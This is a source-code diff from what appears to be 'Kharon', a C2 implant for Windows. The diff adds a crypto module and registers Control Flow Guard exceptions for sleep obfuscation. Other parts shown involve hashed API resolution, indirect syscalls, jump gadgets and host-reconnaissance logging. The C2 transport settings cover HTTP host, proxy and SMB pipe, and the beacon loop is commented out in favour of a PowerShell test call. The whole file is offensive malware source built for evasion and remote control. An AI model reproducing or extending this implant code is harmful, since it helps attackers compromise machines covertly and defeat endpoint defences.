@@ -7,6 +7,7 @@ EXTERN_C DECLFN auto Main(
 ) -> VOID {
     Kharon Kh;
 
+    Crypt     KhCrypt( &Kh );
     Spoof     KhSpoof( &Kh );
     Coff      KhCoff( &Kh );
     HwbpEng   KhHwbp( &Kh );
@@ -28,6 +29,7 @@ EXTERN_C DECLFN auto Main(
     Injection KhInjection( &Kh );
     Mask      KhMask( &Kh );
 
+    Kh.InitCrypt( &KhCrypt );
     Kh.InitSpoof( &KhSpoof );
     Kh.InitCoff( &KhCoff );
     Kh.InitMemory( &KhMemory );
@@ -111,17 +113,29 @@ auto DECLFN Kharon::Init(
 
     this->Ntdll.khRtlFillMemory = ( decltype( this->Ntdll.khRtlFillMemory ) )LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str<CHAR>( "RtlFillMemory" ) );
 
-    KhDbgz( "library kernel32.dll  loaded at %p and functions resolveds", this->Krnl32.Handle    );
-    KhDbgz( "library ntdll.dll     loaded at %p and functions resolveds", this->Ntdll.Handle     );
-    KhDbgz( "library mscoree.dll   loaded at %p and functions resolveds", this->Mscoree.Handle   );
-    KhDbgz( "library advapi32.dll  loaded at %p and functions resolveds", this->Advapi32.Handle  );
-    KhDbgz( "library wininet.dll   loaded at %p and functions resolveds", this->Wininet.Handle   );
-    KhDbgz( "library Oleaut32.dll  loaded at %p and functions resolveds", this->Oleaut32.Handle  );
-    KhDbgz( "library user32.dll    loaded at %p and functions resolveds", this->User32.Handle    );
-    KhDbgz( "library shell32.dll   loaded at %p and functions resolveds", this->Shell32.Handle   );
-    KhDbgz( "library cryptbase.dll loaded at %p and functions resolveds", this->Cryptbase.Handle );
-    KhDbgz( "library ws2_32.dll    loaded at %p and functions resolveds", this->Ws2_32.Handle    );
-    KhDbgz( "library msvcrt.dll    loaded at %p and functions resolveds", this->Msvcrt.Handle    );
+    KhDbgz( "Library kernel32.dll  Loaded at %p and Functions Resolveds", this->Krnl32.Handle    );
+    KhDbgz( "Library ntdll.dll     Loaded at %p and Functions Resolveds", this->Ntdll.Handle     );
+    KhDbgz( "Library mscoree.dll   Loaded at %p and Functions Resolveds", this->Mscoree.Handle   );
+    KhDbgz( "Library advapi32.dll  Loaded at %p and Functions Resolveds", this->Advapi32.Handle  );
+    KhDbgz( "Library wininet.dll   Loaded at %p and Functions Resolveds", this->Wininet.Handle   );
+    KhDbgz( "Library Oleaut32.dll  Loaded at %p and Functions Resolveds", this->Oleaut32.Handle  );
+    KhDbgz( "Library user32.dll    Loaded at %p and Functions Resolveds", this->User32.Handle    );
+    KhDbgz( "Library shell32.dll   Loaded at %p and Functions Resolveds", this->Shell32.Handle   );
+    KhDbgz( "Library cryptbase.dll Loaded at %p and Functions Resolveds", this->Cryptbase.Handle );
+    KhDbgz( "Library ws2_32.dll    Loaded at %p and Functions Resolveds", this->Ws2_32.Handle    );
+    KhDbgz( "Library msvcrt.dll    Loaded at %p and Functions Resolveds", this->Msvcrt.Handle    );
+
+    /* ========= [ cfg exceptions to sleep obf ] ========= */
+    if ( this->Usf->CfgCheck() ) {
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtSetContextThread );
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtGetContextThread );
+        this->Usf->CfgAddrAdd( (PVOID)this->Ntdll.Handle, (PVOID)this->Ntdll.NtWaitForSingleObject );
+        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.WaitForSingleObjectEx );
+        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.VirtualProtect );
+        this->Usf->CfgAddrAdd( (PVOID)this->Krnl32.Handle, (PVOID)this->Krnl32.SetEvent );
+        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction040 );
+        this->Usf->CfgAddrAdd( (PVOID)this->Cryptbase.Handle, (PVOID)this->Cryptbase.SystemFunction041 );
+    }
 
     /* ========= [ syscalls setup ] ========= */
     this->Sys->Ext[syAlloc].Address    = U_PTR( this->Ntdll.NtAllocateVirtualMemory );
@@ -137,8 +151,6 @@ auto DECLFN Kharon::Init(
     for ( INT i = 0; i < syLast -1; i++ ) {
         this->Sys->Fetch( i );
     }
-
-    this->Mk->Ctx.JmpGadget = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
 
     /* ========= [ key generation to xor heap ] ========= */
 
@@ -243,38 +255,39 @@ auto DECLFN Kharon::Init(
     this->Mk->Ctx.NtContinueGadget = ( LdrLoad::_Api( this->Ntdll.Handle, Hsh::Str( "LdrInitializeThunk" ) ) + 19 );
     this->Mk->Ctx.JmpGadget        = this->Usf->FindGadget( this->Ntdll.Handle, 0x23 );
 
-    this->Sys->Enabled = FALSE;
-
     KhDbgz( "======== Session Informations ========" );
-    KhDbgz( "agent id: %s", this->Session.AgentID );
-    KhDbgz( "image path: %s", this->Session.ImagePath );
-    KhDbgz( "command line: %s", this->Session.CommandLine );
-    KhDbgz( "process id: %d", this->Session.ProcessID );
-    KhDbgz( "parent id: %d\n", this->Session.ParentID );
+    KhDbgz( "Agent UUID: %s", this->Session.AgentID );
+    KhDbgz( "Image Path: %s", this->Session.ImagePath );
+    KhDbgz( "Command Line: %s", this->Session.CommandLine );
+    KhDbgz( "Process ID: %d", this->Session.ProcessID );
+    KhDbgz( "Parent ID: %d\n", this->Session.ParentID );
 
     KhDbgz( "======== Machine Informations ========" );
-    KhDbgz( "user name: %s", this->Machine.UserName );
-    KhDbgz( "computer name: %s", this->Machine.CompName );
-    KhDbgz( "net bios: %s", this->Machine.NetBios );
-    KhDbgz( "processor name: %s", this->Machine.ProcessorName );
-    KhDbgz( "total ram: %d", this->Machine.TotalRAM );
-    KhDbgz( "aval ram: %d", this->Machine.AvalRAM );
-    KhDbgz( "used ram: %d\n", this->Machine.UsedRAM );
+    KhDbgz( "User Name: %s", this->Machine.UserName );
+    KhDbgz( "Computer Name: %s", this->Machine.CompName );
+    KhDbgz( "NETBIOS: %s", this->Machine.NetBios );
+    KhDbgz( "Processor Name: %s", this->Machine.ProcessorName );
+    KhDbgz( "Total RAM: %d", this->Machine.TotalRAM );
+    KhDbgz( "Aval RAM: %d", this->Machine.AvalRAM );
+    KhDbgz( "Used RAM: %d\n", this->Machine.UsedRAM );
 
     KhDbgz( "======== Transport Informations ========" );
     KhDbgz("profile c2: %X", PROFILE_C2);
 #if PROFILE_C2 == PROFILE_WEB
-    KhDbgz( "host: %S", this->Tsp->Web.Host );
-    KhDbgz( "port: %d", this->Tsp->Web.Port );
-    KhDbgz( "endpoint: %S", this->Tsp->Web.EndPoint );
-    KhDbgz( "user agent: %S", this->Tsp->Web.UserAgent );
-    KhDbgz( "secure: %d\n", this->Tsp->Web.Secure );
+    KhDbgz( "Host: %S", this->Tsp->Web.Host );
+    KhDbgz( "Port: %d", this->Tsp->Web.Port );
+    KhDbgz( "Endpoint: %S", this->Tsp->Web.EndPoint );
+    KhDbgz( "User Agent: %S", this->Tsp->Web.UserAgent );
+    KhDbgz( "Headers: %S", this->Tsp->Web.HttpHeaders );
+    KhDbgz( "Secure: %s", this->Tsp->Web.Secure ? "TRUE" : "FALSE" );
+    KhDbgz( "Proxy Enabled: %s", this->Tsp->Web.ProxyEnabled ? "TRUE" : "FALSE" );
+    KhDbgz( "Proxy URL: %S", this->Tsp->Web.ProxyUrl );
 #endif
 #if PROFILE_C2 == PROFILE_SMB
-    KhDbgz( "smb pipe name: %s", this->Tsp->Pipe.Name );
+    KhDbgz( "SMB Pipe Name: %s", this->Tsp->Pipe.Name );
 #endif
 
-    KhDbgz( "collected informations and setup agent" );
+    KhDbgz( "Collected informations and setup agent" );
 
     return;
 }
@@ -282,27 +295,29 @@ auto DECLFN Kharon::Init(
 auto DECLFN Kharon::Start( 
     _In_ UPTR Argument 
 ) -> VOID {
-    KhDbgz( "initializing the principal routine" );
+    KhDbgz( "Initializing the principal routine" );
 
-    //
-    // do checkin routine (request + validate connection)
-    //
-    this->Tsp->Checkin();
+    this->Dot->Pwsh( L"pwd", nullptr );
 
-    do {            
-        //
-        // use the wrapper sleep function to run the 
-        //
-        this->Mk->Main( this->Session.SleepTime );
+    // //
+    // // do checkin routine (request + validate connection)
+    // //
+    // this->Tsp->Checkin();
 
-        //
-        // kill date check and perform routine
-        //
-        this->Usf->CheckKillDate();
+    // do {            
+    //     //
+    //     // use the wrapper sleep function to run the 
+    //     //
+    //     this->Mk->Main( this->Session.SleepTime );
+
+    //     //
+    //     // kill date check and perform routine
+    //     //
+    //     this->Usf->CheckKillDate();
    
-        //
-        // start the dispatcher task routine
-        //
-        this->Tk->Dispatcher();
-    } while( 1 );
+    //     //
+    //     // start the dispatcher task routine
+    //     //
+    //     this->Tk->Dispatcher();
+    // } while( 1 );
 }
